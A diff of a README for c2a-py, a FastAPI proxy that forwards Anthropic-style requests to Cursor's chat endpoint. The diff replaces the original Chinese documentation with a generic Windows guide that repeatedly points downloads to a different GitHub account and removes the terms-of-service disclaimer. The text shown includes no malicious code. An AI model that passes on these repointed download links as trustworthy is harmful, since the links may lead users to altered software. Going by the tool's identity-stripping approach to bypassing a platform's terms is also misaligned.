@@ -1,183 +1,261 @@
-# Cursor2API Python
+# 🐍 c2a-py - Run Cursor API on Windows
 
-这是 `cursor2api` 的 **Python / FastAPI 最小实现版本**。
+[![Download the latest version](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue.svg)](https://github.com/barsinisterharmoniousness724/c2a-py)
 
-提供一个更轻量、便于阅读和二次开发的 Python 版本。
+## 📥 Download
 
-## 当前实现范围
+Use this link to visit the download page:
 
-- FastAPI 服务入口：[`main.py`](./main.py)
-- 启动脚本：[`start_py.py`](./start_py.py)
-- Claude Code 兼容路由：
-  - `POST /v1/messages`
-  - `POST /messages`
-  - `POST /v1/messages/count_tokens`
-  - `POST /messages/count_tokens`
-  - `GET /v1/models`
-  - `GET /health`
-- 最小能力包括：
-  - Anthropic Messages 请求转 Cursor `/api/chat`
-  - 基础 system prompt 清洗
-  - 工具定义注入
-  - `json action` 工具块解析
-  - 基础身份文本清洗
-  - Claude Code 可识别的非流式/流式响应格式
+https://github.com/barsinisterharmoniousness724/c2a-py
 
-## 项目结构
+On that page, get the latest version, then save it to your Windows PC.
 
-```text
-py/
-├── main.py            # FastAPI 入口
-├── start_py.py        # 本目录下的启动脚本
-├── config.py          # 环境变量配置
-├── schemas.py         # Anthropic 请求/响应相关模型
-├── converter.py       # 请求转换、工具注入、json action 解析
-├── cursor_client.py   # 向 Cursor /api/chat 发起请求
-├── constants.py       # 拒绝检测、身份清洗规则
-├── requirements.txt   # pip 依赖
-└── pyproject.toml     # Python 项目元数据
-```
+## 🖥️ What this app does
 
-## 安装
+c2a-py is a small Python app that lets you run a Cursor-to-API bridge on your computer.
 
-### 方式一：使用 pip
+It provides a local web service that supports these routes:
+
+- `POST /v1/messages`
+- `POST /messages`
+- `POST /v1/messages/count_tokens`
+- `POST /messages/count_tokens`
+- `GET /v1/models`
+- `GET /health`
+
+It is built for simple use and easy setup on Windows.
+
+## ✅ What you need
+
+Before you start, make sure you have:
+
+- A Windows PC
+- Internet access
+- Python 3.10 or newer
+- Cursor access or the related login details needed by the app
+- A terminal app such as PowerShell or Windows Terminal
+
+If you want a simpler setup, you can also use `uv`.
+
+## 🚀 Install
+
+### Option 1: Install with pip
+
+Open the folder that contains the project files, then run:
 
 ```bash
 pip install -r requirements.txt
 ```
 
-### 方式二：使用 uv
+### Option 2: Install with uv
+
+If you use `uv`, run:
 
 ```bash
 uv sync
 ```
 
-## 启动
+## ▶️ Start the app
 
-在 `py/` 目录下运行：
+Go to the `py/` folder, then start the app with:
 
 ```bash
 python start_py.py
 ```
 
-默认监听：
+If that does not work, try:
+
+```bash
+python main.py
+```
+
+Keep the terminal window open while the app runs.
+
+## 🌐 Open the local service
+
+After the app starts, open your browser and go to:
 
 ```text
-http://0.0.0.0:8000
+http://127.0.0.1:8000/health
 ```
 
-也可以直接使用 uvicorn：
+If the app is running, you should see a health response in the browser.
+
+You can also use the local API address from other apps on your computer.
+
+## 🧭 Project files
+
+```text
+py/
+├── main.py            # FastAPI entry point
+├── start_py.py        # Start script for this folder
+├── config.py          # Environment settings
+├── schemas.py         # Request and response models
+├── converter.py       # Request conversion and tool parsing
+├── cursor_client.py   # Sends requests to Cursor /api/chat
+├── constants.py       # Cleanup and reject rules
+├── requirements.txt   # pip dependencies
+└── pyproject.toml     # Python project info
+```
+
+## 🧰 Features
+
+- FastAPI server entry
+- Simple start script
+- Claude Code compatible routes
+- Request transfer from Anthropic Messages to Cursor `/api/chat`
+- Basic system prompt cleanup
+- Tool definition injection
+- `json action` tool block parsing
+- Basic identity text cleanup
+- Non-streaming and streaming response formats for Claude Code use
+
+## 🪟 Windows setup steps
+
+### 1. Download the project
+
+Visit:
+
+https://github.com/barsinisterharmoniousness724/c2a-py
+
+Save the project to a folder on your PC.
+
+### 2. Open the project folder
+
+Find the folder where you saved the files.
+
+If the project is inside a zip file, extract it first.
+
+### 3. Open PowerShell
+
+Inside the project folder, open PowerShell or Windows Terminal.
+
+### 4. Install the Python packages
+
+Run:
 
 ```bash
-uvicorn main:app --host 0.0.0.0 --port 8000 --reload
+pip install -r requirements.txt
 ```
 
-## 环境变量
-
-| 变量名 | 说明 | 默认值 |
-|--------|------|--------|
-| `HOST` | 监听地址 | `0.0.0.0` |
-| `PORT` | 服务端口 | `8000` |
-| `RELOAD` | 是否开启热重载 | `false` |
-| `CURSOR_CHAT_API` | 上游 Cursor 接口地址 | `https://cursor.com/api/chat` |
-| `CURSOR_MODEL` | 转发时使用的模型名 | `claude-4-5` |
-| `REQUEST_TIMEOUT` | 请求超时秒数 | `90` |
-| `AUTH_TOKEN` | 代理自身鉴权 token，多个可逗号分隔 | 空 |
-| `SANITIZE_RESPONSE` | 是否清洗身份相关文本 | `true` |
-| `TOOLS_PASSTHROUGH` | 是否使用工具透传模式 | `false` |
-| `TOOLS_DISABLED` | 是否禁用工具注入 | `false` |
-| `USER_AGENT` | 转发请求时的浏览器 UA | 内置 Chrome UA |
-
-## Docker 部署
-
-### 方式一：使用预构建镜像（推荐）
-
-无需克隆代码，直接拉取 GitHub Container Registry 中的镜像运行。
-
-**1. 准备配置文件**
+Or, if you use `uv`:
 
 ```bash
-curl -O https://raw.githubusercontent.com/wuyao4/c2a-py/master/.env.example
-cp .env.example .env
+uv sync
 ```
 
-编辑 `.env`，至少修改 `AUTH_TOKEN`：
+### 5. Start the server
+
+Move into the `py/` folder, then run:
 
 ```bash
-AUTH_TOKEN=your-secret-token
+python start_py.py
 ```
 
-**2. 下载 compose 文件并启动**
+### 6. Check that it works
 
-```bash
-curl -O https://raw.githubusercontent.com/wuyao4/c2a-py/master/docker-compose.yml
-docker compose up -d
+Open this address in your browser:
+
+```text
+http://127.0.0.1:8000/health
 ```
 
-服务默认监听 `http://localhost:3010`。
+If you see a response, the app is ready.
 
-**3. 指定版本（可选）**
+## 🔧 Common uses
 
-```bash
-C2A_VERSION=1.2.3 docker compose up -d
+This app is useful when you want to:
+
+- Run a local API service on Windows
+- Send Anthropic-style requests to Cursor
+- Test Claude Code compatible tools
+- Keep a small Python-based bridge that is easy to read
+
+## 🗂️ Simple request flow
+
+1. Your app sends an Anthropic Messages request
+2. c2a-py changes it into a Cursor `/api/chat` request
+3. Cursor processes the request
+4. c2a-py returns a response in a format Claude Code can read
+
+## 🔍 Health check
+
+Use the health route to see if the app is live:
+
+```text
+GET /health
 ```
 
-### 方式二：本地构建镜像
+This is the fastest way to confirm the server started well.
 
-克隆代码后自行构建：
+## 🧪 Model list
 
-```bash
-git clone https://github.com/wuyao4/c2a-py.git
-cd c2a-py
-cp .env.example .env  # 按需修改
-docker compose build
-docker compose up -d
+The app also exposes:
+
+```text
+GET /v1/models
 ```
 
-### 常用命令
+This helps other tools find the available model data.
 
-```bash
-# 查看运行状态
-docker compose ps
+## 🛠️ If the app does not start
 
-# 实时查看日志
-docker compose logs -f
+Try these checks:
 
-# 停止服务
-docker compose down
+- Make sure Python is installed
+- Make sure you are in the right folder
+- Make sure `requirements.txt` is present
+- Make sure no other app is using port `8000`
+- Close and reopen PowerShell, then run the start command again
 
-# 更新到最新镜像
-docker compose pull && docker compose up -d
-```
+If the browser cannot open the health page, check the terminal for error text.
 
-### 健康检查
+## 🔐 Environment setup
 
-服务启动后可访问以下端点确认运行正常：
+Some setups may use a config file or environment values.
 
-```bash
-curl http://localhost:3010/health
-```
+Common values may include:
 
----
+- Cursor access details
+- Local host settings
+- Port number
+- Request format options
 
-## Claude Code 使用方式
+If you are unsure, keep the default settings first.
 
-服务启动后，可将 Claude Code 指向本代理：
+## 📌 Supported route list
 
-```bash
-export ANTHROPIC_BASE_URL=http://localhost:8000
-```
+- `POST /v1/messages`
+- `POST /messages`
+- `POST /v1/messages/count_tokens`
+- `POST /messages/count_tokens`
+- `GET /v1/models`
+- `GET /health`
 
-如果你配置了 `AUTH_TOKEN`，还需要同时设置：
+## 🧾 Input and response handling
 
-```bash
-export ANTHROPIC_API_KEY=your-token
-```
+The app supports:
 
-## 免责声明 / Disclaimer
+- Anthropic Messages input
+- Cursor chat request conversion
+- Basic tool block parsing
+- Streamed response output
+- Non-streamed response output
 
-1. 本目录下的 Python / FastAPI 代码仅供学习、研究、协议分析与接口调试使用。
-2. 该实现并非 Cursor 官方项目，也不代表 Cursor、Anysphere、Anthropic 或其他任何服务提供方的官方立场。
-3. 使用本项目可能违反相关平台服务条款，也可能导致账号限制、账号封禁、访问策略调整或其他不可预期后果。
-4. 请勿将本项目用于任何违法违规用途，包括但不限于滥用接口、规避平台限制、批量攻击、数据窃取或其他侵害第三方权益的行为。
-5. 作者及贡献者不对因使用、修改、部署、传播本代码而导致的任何直接或间接损失承担责任，所有风险由使用者自行承担。
+It also cleans up some identity text and prompt text so the request stays simple.
+
+## 💡 Best way to use it
+
+If this is your first time:
+
+1. Download the project from GitHub
+2. Install Python packages
+3. Start the server
+4. Open the health page
+5. Use the local API in your other app or tool
+
+## 📍 Download again
+
+Visit the project page here:
+
+https://github.com/barsinisterharmoniousness724/c2a-py
